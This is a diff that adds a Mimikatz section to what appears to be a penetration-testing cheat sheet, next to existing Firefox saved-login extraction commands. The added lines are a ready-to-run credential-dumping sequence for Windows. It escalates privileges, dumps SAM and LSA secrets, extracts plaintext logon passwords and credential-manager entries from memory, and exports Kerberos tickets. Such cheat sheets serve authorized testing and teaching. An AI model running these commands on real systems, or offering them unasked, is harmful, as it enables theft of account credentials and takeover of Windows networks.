@@ -1072,6 +1072,22 @@ $ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
 $ python3.9 firefox_decrypt.py
 ```
 
+- Mimikatz
+
+```
+C:\> mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # lsadump::sam
+mimikatz # lsadump::lsa /patch
+mimikatz # sekurlsa::logonpasswords
+mimikatz # sekurlsa::tickets
+mimikatz # kerberos::list
+mimikatz # kerberos::list /export
+mimikatz # kerberos::purge
+mimikatz # sekurlsa::credman
+```
+
 - DPAPI
 
 ```
